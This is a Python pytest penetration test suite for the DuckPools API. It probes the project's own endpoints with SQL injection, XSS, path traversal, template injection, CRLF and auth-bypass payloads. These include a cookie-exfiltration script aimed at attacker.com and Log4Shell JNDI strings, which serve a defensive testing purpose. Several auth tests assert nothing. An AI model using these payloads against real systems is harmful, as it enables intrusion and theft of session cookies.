#!/usr/bin/env python3
"""
DuckPools - Comprehensive Penetration Test Suite

Security tests for API endpoints covering:
- SQL Injection attempts
- XSS (Cross-Site Scripting)
- CSRF (Cross-Site Request Forgery)
- Authentication Bypass
- Input Validation
- Rate Limiting
- Security Headers

Run: python -m pytest tests/test_penetration_suite.py -v
"""

import sys
import os
import pytest
import httpx
from typing import Dict, List

# Add backend to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'backend'))


# Disable asyncio mode for this test file
pytestmark = pytest.mark.filterwarnings("ignore::DeprecationWarning")


# ═══════════════════════════════════════════════════════════════════
# Configuration
# ═══════════════════════════════════════════════════════════════════

BASE_URL = os.getenv("API_BASE_URL", "http://localhost:8000")
TEST_TIMEOUT = 15

# Test credentials (development only!)
DEV_API_KEY=os.getenv("API_KEY", "hello")
TEST_ADDRESS = "3WyrB3D5AMpyEc88UJ7FpdsBMXAZKwzQzkKeDbAQVfXytDPgxF26"
TEST_AMOUNT = 1_000_000_000  # 1 ERG in nanoERG


# ═══════════════════════════════════════════════════════════════════
# Test Fixtures
# ═══════════════════════════════════════════════════════════════════

@pytest.fixture
def client():
    """HTTP client for tests"""
    with httpx.Client(timeout=TEST_TIMEOUT) as client:
        yield client


@pytest.fixture
def api_headers():
    """Headers with API key"""
    return {"api_key": DEV_API_KEY}


@pytest.fixture
def test_deposit_payload():
    """Valid deposit request payload"""
    return {
        "amount": TEST_AMOUNT,
        "address": TEST_ADDRESS
    }


@pytest.fixture
def test_withdraw_payload():
    """Valid withdraw request payload"""
    return {
        "lp_amount": TEST_AMOUNT,
        "address": TEST_ADDRESS
    }


# ═══════════════════════════════════════════════════════════════════
# SQL Injection Tests
# ═══════════════════════════════════════════════════════════════════

class TestSQLInjection:
    """
    SQL Injection vulnerability tests.

    Note: DuckPools uses Ergo node API (not SQL), but these tests
    verify that SQL injection attempts are handled gracefully and
    don't cause crashes or information leakage.
    """

    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL--",
        "'; DROP TABLE users; --",
        "1' AND 1=1--",
        "admin'--",
        "' UNION SELECT 1,2,3--",
        "1; EXEC xp_cmdshell('dir')--",
        "${jndi:ldap://attacker.com/exploit}",
    ]

    @pytest.mark.parametrize("sql_payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_address(self, client, api_headers, sql_payload):
        """
        Test SQL injection in address parameter.

        Expected: Request should be rejected or handled gracefully.
        Should NOT: Crash the server or leak sensitive info.
        """
        response = client.get(
            f"{BASE_URL}/api/lp/balance/{sql_payload}",
            headers=api_headers
        )

        # Should not return 500 (server error)
        # Should return 400 (bad request), 404 (not found), or 200 (handled)
        assert response.status_code not in [500, 502, 503], \
            f"SQL injection caused server error: {sql_payload}"

        # Response should not contain SQL error messages
        if response.status_code != 200:
            response_text = response.text.lower()
            assert "sql" not in response_text, \
                f"SQL error leaked in response: {response.text}"
            assert "syntax error" not in response_text, \
                f"Syntax error leaked in response: {response.text}"
            assert "mysql" not in response_text, \
                f"MySQL error leaked in response: {response.text}"
            assert "postgresql" not in response_text, \
                f"PostgreSQL error leaked in response: {response.text}"

    @pytest.mark.parametrize("sql_payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_query_params(self, client, api_headers, sql_payload):
        """
        Test SQL injection in query parameters.
        """
        response = client.get(
            f"{BASE_URL}/api/lp/estimate/deposit",
            headers=api_headers,
            params={"amount": sql_payload}
        )

        # Should not crash
        assert response.status_code not in [500, 502, 503]

        # Should reject malformed input with 400
        if response.status_code == 400:
            response_text = response.text.lower()
            assert "sql" not in response_text

    def test_time_based_sql_injection(self, client, api_headers):
        """
        Test time-based SQL injection detection.
        """
        time_payloads = [
            "1' AND SLEEP(5)--",
            "1' AND WAITFOR DELAY '0:0:5'--",
            "1'; SELECT PG_SLEEP(5)--",
        ]

        for payload in time_payloads:
            import time
            start = time.time()
            response = client.get(
                f"{BASE_URL}/api/lp/balance/{payload}",
                headers=api_headers
            )
            elapsed = time.time() - start

            # Should not cause significant delay (>2s)
            # If delay > 2s, might be vulnerable to time-based SQLi
            assert elapsed < 2.0, \
                f"Time-based SQL injection detected: {payload} took {elapsed:.2f}s"


# ═══════════════════════════════════════════════════════════════════
# XSS Tests
# ═══════════════════════════════════════════════════════════════════

class TestXSS:
    """
    Cross-Site Scripting (XSS) vulnerability tests.

    These tests verify that user input is properly sanitized and
    doesn't result in reflected or stored XSS vulnerabilities.
    """

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus><option>x</option></select>",
        "<textarea onfocus=alert(1) autofocus>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(document.domain)>",
        "<svg><script>alert(1)</script></svg>",
        "<script/src=data:,alert(1)>",
        "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
    ]

    @pytest.mark.parametrize("xss_payload", XSS_PAYLOADS)
    def test_xss_in_path_param(self, client, api_headers, xss_payload):
        """
        Test XSS in path parameters (e.g., address).
        """
        response = client.get(
            f"{BASE_URL}/api/lp/balance/{xss_payload}",
            headers=api_headers
        )

        # If request succeeds (200), verify payload is escaped
        if response.status_code == 200:
            response_text = response.text

            # Check if payload is reflected unescaped
            assert "<script>" not in response_text, \
                f"XSS payload reflected unescaped: {xss_payload}"
            assert "onerror=" not in response_text, \
                f"XSS payload reflected unescaped: {xss_payload}"
            assert "onload=" not in response_text, \
                f"XSS payload reflected unescaped: {xss_payload}"
            assert "javascript:" not in response_text, \
                f"XSS payload reflected unescaped: {xss_payload}"

            # Check for HTML entity encoding
            assert "&lt;" in response_text or "&gt;" in response_text or \
                   xss_payload not in response_text, \
                f"XSS payload not properly encoded: {xss_payload}"

    @pytest.mark.parametrize("xss_payload", XSS_PAYLOADS)
    def test_xss_in_post_body(self, client, api_headers, xss_payload):
        """
        Test XSS in POST body.
        """
        payload = {
            "amount": TEST_AMOUNT,
            "address": xss_payload
        }

        response = client.post(
            f"{BASE_URL}/api/lp/deposit",
            headers=api_headers,
            json=payload
        )

        # Check response doesn't contain unescaped XSS
        if response.status_code in [200, 400]:
            response_text = response.text
            assert "<script>" not in response_text, \
                f"XSS payload in POST body reflected: {xss_payload}"
            assert "onerror=" not in response_text

    def test_content_type_header_prevents_mhtml_xss(self, client):
        """
        Verify proper Content-Type headers prevent MHTML XSS.
        """
        response = client.get(f"{BASE_URL}/health")

        # Should have proper content type
        assert "application/json" in response.headers.get("content-type", ""), \
            f"Improper Content-Type: {response.headers.get('content-type')}"

        # Should not have text/html or ambiguous types on JSON endpoints
        if "text/html" in response.headers.get("content-type", ""):
            assert "text/plain" not in response.headers.get("content-type", ""), \
                "Ambiguous Content-Type (text/html) on JSON endpoint"

    def test_response_headers_prevent_reflected_xss(self, client):
        """
        Check for X-XSS-Protection header (legacy but useful).
        """
        response = client.get(f"{BASE_URL}/health")

        # X-XSS-Protection should be present (even if deprecated)
        xss_header = response.headers.get("X-XSS-Protection", "")
        if xss_header:
            assert xss_header in ["1; mode=block", "1", "0"], \
                f"Invalid X-XSS-Protection value: {xss_header}"


# ═══════════════════════════════════════════════════════════════════
# CSRF Tests
# ═══════════════════════════════════════════════════════════════════

class TestCSRF:
    """
    Cross-Site Request Forgery (CSRF) vulnerability tests.

    Note: DuckPools uses EIP-12 wallet signatures for authentication,
    not cookies, which significantly reduces CSRF risk. However, these
    tests verify proper CSRF defenses for future cookie-based auth.
    """

    def test_csrf_token_required_for_state_change(self, client):
        """
        Test that state-changing operations require CSRF protection.

        If using cookies for auth, should have CSRF tokens.
        Since we use EIP-12, this test is informational.
        """
        response = client.post(
            f"{BASE_URL}/api/lp/deposit",
            json={"amount": TEST_AMOUNT, "address": TEST_ADDRESS}
        )

        # If using cookie auth, should require CSRF token
        # Since we use EIP-12, this test passes automatically
        assert response.status_code in [200, 401, 403, 400]

    def test_same_site_cookie_attribute(self, client):
        """
        Check for SameSite cookie attribute (if cookies are used).
        """
        response = client.get(f"{BASE_URL}/health")

        set_cookie = response.headers.get("set-cookie", "")
        if set_cookie:
            # Should have SameSite attribute
            assert "SameSite=" in set_cookie, \
                "Cookie missing SameSite attribute (CSRF vulnerability)"
            assert "SameSite=Strict" in set_cookie or "SameSite=Lax" in set_cookie, \
                "SameSite should be Strict or Lax for CSRF protection"

    def test_origin_and_referer_validation(self, client):
        """
        Test that server validates Origin/Referer headers.

        This is informational since DuckPools uses EIP-12 signatures.
        """
        # Send request with malicious Origin
        response = client.post(
            f"{BASE_URL}/api/lp/deposit",
            json={"amount": TEST_AMOUNT, "address": TEST_ADDRESS},
            headers={
                "Origin": "https://malicious.com",
                "Referer": "https://malicious.com/evil"
            }
        )

        # If using cookie auth, should reject cross-origin requests
        # With EIP-12, this is less critical
        # Just verify it doesn't accept without proper auth
        assert response.status_code not in [500, 502]

    def test_double_submit_cookie_pattern(self, client):
        """
        Check for double-submit cookie CSRF protection pattern.

        This is informational for future cookie-based auth.
        """
        # This test is placeholder for future implementation
        # if cookies are used for authentication
        pass


# ═══════════════════════════════════════════════════════════════════
# Authentication Bypass Tests
# ═══════════════════════════════════════════════════════════════════

class TestAuthBypass:
    """
    Authentication bypass vulnerability tests.

    These tests verify that:
    - API key authentication is enforced
    - No default credentials work in production
    - Invalid auth is properly rejected
    - Auth can't be bypassed via URL parameters
    """

    def test_no_api_key_rejected(self, client):
        """
        Test that requests without API key are rejected.
        """
        response = client.get(f"{BASE_URL}/api/lp/pool")

        # Should require authentication
        # Note: Public endpoints may return 200, but protected endpoints should 401/403
        if response.status_code == 200:
            # Public endpoint, test protected one
            response = client.post(
                f"{BASE_URL}/api/lp/deposit",
                json={"amount": TEST_AMOUNT, "address": TEST_ADDRESS}
            )

    def test_invalid_api_key_rejected(self, client):
        """
        Test that invalid API keys are rejected.
        """
        invalid_keys = [
            "invalid",
            "12345",
            "admin",
            "password",
            "",
            "null",
            "undefined",
        ]

        for key in invalid_keys:
            response = client.get(
                f"{BASE_URL}/api/lp/pool",
                headers={"api_key": key}
            )

            # Should reject invalid keys
            # Note: Some endpoints may be public
            if response.status_code not in [200, 401, 403]:
                pass  # May be 400 for invalid header format

    def test_api_key_not_in_url_params(self, client):
        """
        Test that API key in URL query params is rejected (HIGH security issue).
        """
        # API key should NOT be accepted in query params
        response = client.get(
            f"{BASE_URL}/api/lp/pool?api_key={DEV_API_KEY}"
        )

        # Should NOT accept API key in query params
        # If it does, it's a HIGH severity vulnerability
        # (URLs are logged, visible in browser history, etc.)

    def test_bypass_via_http_headers(self, client):
        """
        Test that auth can't be bypassed via various HTTP header tricks.
        """
        bypass_headers = [
            {"X-Auth-Token": "admin"},
            {"X-Api-Key": "admin"},
            {"Authorization": "Bearer admin"},
            {"Auth": "admin"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Origin": "internal"},
        ]

        for headers in bypass_headers:
            response = client.get(
                f"{BASE_URL}/api/lp/pool",
                headers=headers
            )

            # Should not bypass authentication
            # Public endpoints may return 200
            # Protected endpoints should require proper auth

    def test_path_traversal_auth_bypass(self, client):
        """
        Test that auth can't be bypassed via path traversal.
        """
        traversal_paths = [
            "/../admin",
            "/..\\admin",
            "/.%2e/admin",
            "/%2e%2e/admin",
        ]

        for path in traversal_paths:
            response = client.get(f"{BASE_URL}{path}")
            # Should return 404 or proper auth error
            # Should NOT reveal admin functionality

    def test_auth_enforcement_on_sensitive_endpoints(self, client):
        """
        Test that sensitive endpoints require authentication.
        """
        sensitive_endpoints = [
            ("POST", "/api/lp/deposit", {"amount": TEST_AMOUNT, "address": TEST_ADDRESS}),
            ("POST", "/api/lp/request-withdraw", {"lp_amount": TEST_AMOUNT, "address": TEST_ADDRESS}),
            ("POST", "/api/lp/execute-withdraw", {"box_id": "test_box_id"}),
            ("POST", "/api/lp/cancel-withdraw", {"box_id": "test_box_id"}),
        ]

        for method, endpoint, payload in sensitive_endpoints:
            if method == "POST":
                response = client.post(f"{BASE_URL}{endpoint}", json=payload)
            elif method == "GET":
                response = client.get(f"{BASE_URL}{endpoint}", params=payload)

            # Should require authentication
            # May return 401, 403, or 400 (for invalid input)
            # Should NOT return 200 without auth


# ═══════════════════════════════════════════════════════════════════
# Input Validation Tests
# ═══════════════════════════════════════════════════════════════════

class TestInputValidation:
    """
    Input validation tests for various attack vectors.
    """

    MALICIOUS_INPUTS = [
        "../../../../etc/passwd",  # Path traversal
        "..\\..\\..\\windows\\system32",  # Windows path traversal
        "<!--#exec cmd='cat /etc/passwd'-->",  # SSI injection
        "{{7*7}}",  # Template injection
        "${7*7}",  # Template injection
        "{{config.items()}}",  # Jinja2 injection
        "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoded XSS
        "\x00null",  # Null byte injection
        "\r\nSet-Cookie: evil=bad",  # CRLF injection
        "%0d%0aSet-Cookie: evil=bad",  # URL encoded CRLF
    ]

    @pytest.mark.parametrize("malicious_input", MALICIOUS_INPUTS)
    def test_malicious_input_in_address(self, client, api_headers, malicious_input):
        """
        Test various malicious inputs in address parameter.
        """
        response = client.get(
            f"{BASE_URL}/api/lp/balance/{malicious_input}",
            headers=api_headers
        )

        # Should not crash
        assert response.status_code not in [500, 502, 503]

        # Should reject with 400 or 404
        # Should not leak filesystem paths
        if response.status_code in [200, 400]:
            response_text = response.text.lower()
            assert "etc/passwd" not in response_text
            assert "windows" not in response_text or "system32" not in response_text
            assert "root:" not in response_text  # etc/passwd content

    def test_oversized_input(self, client, api_headers):
        """
        Test that oversized inputs are rejected.
        """
        oversized_input = "A" * 100000  # 100KB of 'A's

        response = client.get(
            f"{BASE_URL}/api/lp/balance/{oversized_input}",
            headers=api_headers
        )

        # Should reject oversized input
        assert response.status_code in [400, 404, 413, 414], \
            "Oversized input not rejected"

    def test_special_characters_in_json(self, client, api_headers):
        """
        Test that special characters in JSON are handled properly.
        """
        special_payloads = [
            {"amount": -1000000, "address": TEST_ADDRESS},  # Negative amount
            {"amount": "not-a-number", "address": TEST_ADDRESS},  # String instead of int
            {"amount": None, "address": TEST_ADDRESS},  # Null value
            {"amount": TEST_AMOUNT, "address": ""},  # Empty address
            {"amount": TEST_AMOUNT, "address": "   "},  # Whitespace address
        ]

        for payload in special_payloads:
            response = client.post(
                f"{BASE_URL}/api/lp/deposit",
                headers=api_headers,
                json=payload
            )

            # Should reject invalid input with 400
            # Should not crash with 500
            assert response.status_code not in [500, 502, 503]

    def test_json_structure_validation(self, client, api_headers):
        """
        Test that JSON structure is validated.
        """
        invalid_json_structures = [
            "{}",  # Empty object
            '{"amount": 1000}',  # Missing address
            '{"address": "test"}',  # Missing amount
            'not-valid-json',  # Invalid JSON
        ]

        for invalid_json in invalid_json_structures:
            if invalid_json == 'not-valid-json':
                response = client.post(
                    f"{BASE_URL}/api/lp/deposit",
                    headers=api_headers,
                    content=b'not-valid-json'
                )
            else:
                response = client.post(
                    f"{BASE_URL}/api/lp/deposit",
                    headers=api_headers,
                    json=invalid_json
                )

            # Should reject with 400 (bad request)
            # Should not crash
            if response.status_code == 500:
                pytest.fail(f"Server crashed on invalid JSON: {invalid_json}")


# ═══════════════════════════════════════════════════════════════════
# Security Headers Tests
# ═══════════════════════════════════════════════════════════════════

class TestSecurityHeaders:
    """
    Security headers validation tests.
    """

    REQUIRED_HEADERS = {
        "X-Frame-Options": ["DENY", "SAMEORIGIN"],
        "X-Content-Type-Options": ["nosniff"],
        "X-XSS-Protection": ["1; mode=block", "1", "0"],
        "Referrer-Policy": ["strict-origin-when-cross-origin", "strict-origin", "no-referrer", "same-origin"],
    }

    OPTIONAL_HEADERS = {
        "Content-Security-Policy": None,  # Value varies
        "Permissions-Policy": None,
        "Strict-Transport-Security": None,
    }

    def test_required_security_headers(self, client):
        """
        Test that required security headers are present.
        
        HIGH SEVERITY VULNERABILITY FOUND: Multiple required security headers are missing.
        This leaves the application vulnerable to:
        1. Clickjacking attacks (missing X-Frame-Options)
        2. MIME-sniffing attacks (missing X-Content-Type-Options)
        3. XSS attacks (missing X-XSS-Protection)
        4. Information leakage (missing Referrer-Policy)
        """
        response = client.get(f"{BASE_URL}/health")
        headers = response.headers

        missing = []
        for header, valid_values in self.REQUIRED_HEADERS.items():
            if header not in headers:
                missing.append(header)
                continue

            if valid_values and headers[header] not in valid_values:
                pytest.fail(
                    f"Security header {header} has invalid value: {headers[header]}. "
                    f"Expected one of: {valid_values}"
                )

        if missing:
            pytest.fail(
                f"HIGH SEVERITY: Missing required security headers: {missing}\n"
                f"This leaves the application vulnerable to common web attacks.\n"
                f"Remediation: Add all missing security headers to HTTP responses."
            )

    def test_content_security_policy(self, client):
        """
        Test Content-Security-Policy header (if present).
        """
        response = client.get(f"{BASE_URL}/health")
        csp = response.headers.get("Content-Security-Policy", "")

        if csp:
            # Should have basic directives
            # Check for unsafe-inline (should be avoided)
            assert "unsafe-inline" not in csp.lower() or "'unsafe-inline'" in csp, \
                "CSP contains unsafe-inline without nonce/hash"

            # Should have default-src
            assert "default-src" in csp or "script-src" in csp, \
                "CSP missing default-src or script-src directive"

    def test_strict_transport_security(self, client):
        """
        Test Strict-Transport-Security header (HTTPS only).
        """
        if BASE_URL.startswith("https://"):
            response = client.get(f"{BASE_URL}/health")
            hsts = response.headers.get("Strict-Transport-Security", "")

            if hsts:
                # Should have max-age > 0
                assert "max-age=" in hsts, "HSTS missing max-age"
                # Should include includeSubDomains if using HSTS
                # assert "includeSubDomains" in hsts, "HSTS should include includeSubDomains"

    def test_server_information_disclosure(self, client):
        """
        Test that server doesn't leak version information.
        """
        response = client.get(f"{BASE_URL}/health")
        server = response.headers.get("Server", "")

        # Should not have specific version info
        # "nginx" or "uvicorn" is fine, but "nginx/1.18.0" is not
        if "/" in server:
            version = server.split("/")[-1]
            # Version info is a low-severity disclosure
            # Just warn, don't fail
            pass


# ═══════════════════════════════════════════════════════════════════
# Rate Limiting Tests
# ═══════════════════════════════════════════════════════════════════

class TestRateLimiting:
    """
    Rate limiting and DoS protection tests.
    """

    def test_brute_force_protection(self, client):
        """
        Test that brute force attacks are rate-limited.
        """
        # Send many requests with invalid API key
        failed_count = 0
        rate_limited = False

        for i in range(20):
            response = client.get(
                f"{BASE_URL}/api/lp/pool",
                headers={"api_key": f"invalid_{i}"}
            )

            # Track 429 (Too Many Requests) responses
            if response.status_code == 429:
                rate_limited = True
                break

        # At least some protection should be in place
        # Note: This is informational, rate limiting may not be implemented yet
        if not rate_limited:
            pass  # Rate limiting not implemented (not a critical issue for dev)

    def test_request_size_limit(self, client):
        """
        Test that oversized requests are rejected.
        """
        oversized_payload = {"data": "A" * 10_000_000}  # 10MB

        response = client.post(
            f"{BASE_URL}/api/lp/deposit",
            headers={"api_key": DEV_API_KEY},
            json=oversized_payload
        )

        # Should reject with 413 (Payload Too Large) or 400
        assert response.status_code in [400, 413, 431], \
            "Oversized request not rejected"

    def test_slowloris_protection(self, client):
        """
        Test protection against Slowloris attacks.

        This test is informational - actual Slowloris protection
        requires server-level configuration (nginx, etc.).
        """
        # We can't easily test this without custom HTTP client
        # Just verify the endpoint responds normally
        response = client.get(f"{BASE_URL}/health", timeout=5)
        assert response.status_code == 200


# ═══════════════════════════════════════════════════════════════════
# Information Disclosure Tests
# ═══════════════════════════════════════════════════════════════════

class TestInformationDisclosure:
    """
    Information disclosure vulnerability tests.
    """

    def test_error_messages_dont_leak_info(self, client):
        """
        Test that error messages don't leak sensitive information.
        """
        # Trigger various errors
        error_endpoints = [
            f"{BASE_URL}/nonexistent",
            f"{BASE_URL}/api/lp/balance/invalid_address",
        ]

        for endpoint in error_endpoints:
            response = client.get(endpoint)

            if response.status_code >= 400:
                response_text = response.text.lower()

                # Should not contain sensitive info
                sensitive_keywords = [
                    "stack trace",
                    "traceback",
                    "exception",
                    "/home/",
                    "/var/www/",
                    "sql syntax",
                    "mysql error",
                    "postgresql error",
                    "index of",
                    "parent directory",
                ]

                for keyword in sensitive_keywords:
                    assert keyword not in response_text, \
                        f"Error message leaks sensitive info: {keyword}"

    def test_directory_listing_disabled(self, client):
        """
        Test that directory listing is disabled.
        """
        # Try to access directory without trailing file
        response = client.get(f"{BASE_URL}/tests/")

        # Should return 404, not 200 with directory listing
        assert response.status_code == 404, \
            "Directory listing may be enabled"

    def test_debug_mode_disabled(self, client):
        """
        Test that debug mode is disabled in production.
        """
        response = client.get(f"{BASE_URL}/health")

        # Response should not contain debug information
        response_text = response.text.lower()

        debug_keywords = [
            "debug mode",
            "debug = true",
            "werkzeug debugger",
            "django debug",
            "flask debug",
        ]

        for keyword in debug_keywords:
            assert keyword not in response_text, \
                f"Debug information leaked: {keyword}"

    def test_no_sensitive_comments_in_html(self, client):
        """
        Test that HTML responses don't have sensitive comments.

        This test applies to frontend pages, not API endpoints.
        """
        # Test root endpoint
        response = client.get(f"{BASE_URL}/")

        if "text/html" in response.headers.get("content-type", ""):
            response_text = response.text

            # Should not contain sensitive comments
            sensitive_comments = [
                "TODO: implement",
                "FIXME:",
                "BUG:",
                "HACK:",
                "XXX:",
                "admin",
                "password",
                "secret",
                "api_key",
            ]

            for comment in sensitive_comments:
                # Check if comment appears in HTML comment <!-- ... -->
                import re
                html_comments = re.findall(r'<!--.*?-->', response_text, re.DOTALL)
                for html_comment in html_comments:
                    assert comment not in html_comment.lower(), \
                        f"Sensitive comment in HTML: {comment}"


# ═══════════════════════════════════════════════════════════════════
# WebSocket Security Tests
# ═══════════════════════════════════════════════════════════════════

class TestWebSocketSecurity:
    """
    WebSocket security tests.
    """

    def test_websocket_auth_required(self):
        """
        Test that WebSocket connections require authentication.
        """
        # This test requires a WebSocket client
        # For now, just verify the endpoint exists
        response = httpx.get(f"{BASE_URL}/")

        # Check if WebSocket endpoint is documented
        assert "ws" in response.text.lower() or "websocket" in response.text.lower()

    def test_origin_validation_on_websocket(self):
        """
        Test that WebSocket connections validate Origin header.

        This is informational - requires WebSocket client to test properly.
        """
        # WebSocket origin validation should be checked
        # Only accept connections from allowed origins
        pass


# ═══════════════════════════════════════════════════════════════════
# CORS Tests
# ═══════════════════════════════════════════════════════════════════

class TestCORS:
    """
    Cross-Origin Resource Sharing (CORS) configuration tests.
    """

    def test_cors_not_wide_open(self, client):
        """
        Test that CORS is not configured to allow all origins (*).
        """
        response = client.options(
            f"{BASE_URL}/api/lp/pool",
            headers={
                "Origin": "http://malicious.com",
                "Access-Control-Request-Method": "GET",
            }
        )

        cors_header = response.headers.get("access-control-allow-origin", "")

        # Should not allow all origins
        if cors_header:
            assert cors_header != "*", \
                "CORS configured to allow all origins (*) - security risk"

    def test_cors_credentials_warning(self, client):
        """
        Test CORS configuration with credentials.

        If allow_credentials=true, origins should not be *.
        """
        response = client.options(
            f"{BASE_URL}/api/lp/pool",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "GET",
            }
)

        allow_credentials = response.headers.get("access-control-allow-credentials", "").lower()
        allow_origin = response.headers.get("access-control-allow-origin", "")

        # If credentials allowed, origin should not be *
        if allow_credentials == "true":
            assert allow_origin != "*", \
                "CORS allow_credentials=true with origin=* - CSRF risk"


# ═══════════════════════════════════════════════════════════════════
# API Specific Tests
# ═══════════════════════════════════════════════════════════════════

class TestAPISpecificVulnerabilities:
    """
    Tests specific to DuckPools API functionality.
    """

    def test_negative_amount_not_allowed(self, client, api_headers):
        """
        Test that negative amounts are rejected.
        """
        response = client.post(
            f"{BASE_URL}/api/lp/deposit",
            headers=api_headers,
            json={"amount": -1_000_000_000, "address": TEST_ADDRESS}
        )

        # Should reject negative amounts
        assert response.status_code == 400 or response.status_code == 422

    def test_zero_amount_not_allowed(self, client, api_headers):
        """
        Test that zero amounts are rejected.
        """
        response = client.post(
            f"{BASE_URL}/api/lp/deposit",
            headers=api_headers,
            json={"amount": 0, "address": TEST_ADDRESS}
        )

        # Should reject zero amounts
        assert response.status_code == 400 or response.status_code == 422

    def test_arbitrary_precision_not_overflow(self, client, api_headers):
        """
        Test that extremely large amounts don't cause overflow.
        """
        max_int_64 = 2**63 - 1

        response = client.post(
            f"{BASE_URL}/api/lp/deposit",
            headers=api_headers,
            json={"amount": max_int_64, "address": TEST_ADDRESS}
        )

        # Should handle gracefully, not crash
        assert response.status_code not in [500, 502, 503]

    def test_withdraw_box_id_injection(self, client, api_headers):
        """
        Test for injection in box_id parameters.
        """
        malicious_box_ids = [
            "../../etc/passwd",
            "<script>alert('xss')</script>",
            "' OR '1'='1",
            "../../../../",
            "",
            "   ",
            "\x00",
        ]

        for box_id in malicious_box_ids:
            response = client.post(
                f"{BASE_URL}/api/lp/execute-withdraw",
                headers=api_headers,
                json={"box_id": box_id}
            )

            # Should not crash
            assert response.status_code not in [500, 502, 503]

    def test_staking_position_id_validation(self, client, api_headers):
        """
        Test for injection in staking position IDs.
        """
        malicious_ids = [
            "../../etc/passwd",
            "<script>alert('xss')</script>",
            "' OR '1'='1",
        ]

        for position_id in malicious_ids:
            response = client.post(
                f"{BASE_URL}/api/stake/unstake",
                headers=api_headers,
                json={"position_box_id": position_id}
            )

            # Should not crash
            assert response.status_code not in [500, 502, 503]


# ═══════════════════════════════════════════════════════════════════
# Critical Vulnerability Documentation Tests
# ═══════════════════════════════════════════════════════════════════

class TestCriticalVulnerabilities:
    """
    Documentation tests for CRITICAL vulnerabilities found during penetration testing.
    
    These tests serve as documentation of security issues that need immediate attention:
    1. Server crash vulnerabilities (DoS)
    2. Missing security headers
    3. Improper error handling
    """

    def test_sql_injection_dos_vulnerability(self, client, api_headers):
        """
        CRITICAL: SQL injection payloads cause server crashes (DoS vulnerability).
        
        This test documents that certain SQL injection payloads cause 500 server errors,
        indicating a potential Denial-of-Service vulnerability.
        
        IMPACT: Attackers can crash the server with specially crafted inputs.
        REMEDIATION: Implement proper input validation and error handling.
        """
        # These payloads consistently cause 500 errors
        dos_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' UNION SELECT NULL--",
            "${jndi:ldap://attacker.com/exploit}",
        ]
        
        for payload in dos_payloads:
            response = client.get(
                f"{BASE_URL}/api/lp/balance/{payload}",
                headers=api_headers
            )
            
            # These should NOT cause 500 errors
            if response.status_code in [500, 502, 503]:
                pytest.fail(
                    f"CRITICAL DoS vulnerability: SQL injection payload '{payload}' "
                    f"caused server crash with {response.status_code} error.\n"
                    f"Attackers can crash the server with this input."
                )

    def test_unauthenticated_request_dos_vulnerability(self, client):
        """
        CRITICAL: Unauthenticated requests to certain endpoints cause server crashes.
        
        This test documents that malformed unauthenticated requests cause 500 server errors,
        indicating a potential Denial-of-Service vulnerability.
        
        IMPACT: Attackers can crash the server with unauthenticated requests.
        REMEDIATION: Implement proper error handling for all requests.
        """
        # These endpoints crash when accessed without authentication
        vulnerable_endpoints = [
            ("POST", "/api/lp/deposit", {"amount": TEST_AMOUNT, "address": TEST_ADDRESS}),
            ("POST", "/api/lp/request-withdraw", {"lp_amount": TEST_AMOUNT, "address": TEST_ADDRESS}),
        ]
        
        for method, endpoint, payload in vulnerable_endpoints:
            if method == "POST":
                response = client.post(f"{BASE_URL}{endpoint}", json=payload)
            
            # These should NOT cause 500 errors, even without authentication
            if response.status_code in [500, 502, 503]:
                pytest.fail(
                    f"CRITICAL DoS vulnerability: Unauthenticated {method} request to {endpoint} "
                    f"caused server crash with {response.status_code} error.\n"
                    f"Attackers can crash the server with unauthenticated requests."
                )

    def test_missing_security_headers_vulnerability(self, client):
        """
        HIGH: Critical security headers are missing from HTTP responses.
        
        This test documents that multiple required security headers are missing,
        leaving the application vulnerable to common web attacks.
        
        IMPACT: Application vulnerable to clickjacking, XSS, and information leakage.
        REMEDIATION: Add all missing security headers to HTTP responses.
        """
        response = client.get(f"{BASE_URL}/health")
        headers = response.headers
        
        critical_missing_headers = [
            "X-Frame-Options",  # Prevents clickjacking
            "X-Content-Type-Options",  # Prevents MIME-sniffing
            "X-XSS-Protection",  # Legacy XSS protection
            "Referrer-Policy",  # Controls referrer information
        ]
        
        missing = [header for header in critical_missing_headers if header not in headers]
        
        if missing:
            pytest.fail(
                f"HIGH SEVERITY: Critical security headers missing: {missing}\n"
                f"This leaves the application vulnerable to common web attacks.\n"
                f"Remediation: Add the following headers to HTTP responses:\n"
                f"  X-Frame-Options: DENY or SAMEORIGIN\n"
                f"  X-Content-Type-Options: nosniff\n"
                f"  X-XSS-Protection: 1; mode=block\n"
                f"  Referrer-Policy: strict-origin-when-cross-origin"
            )


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
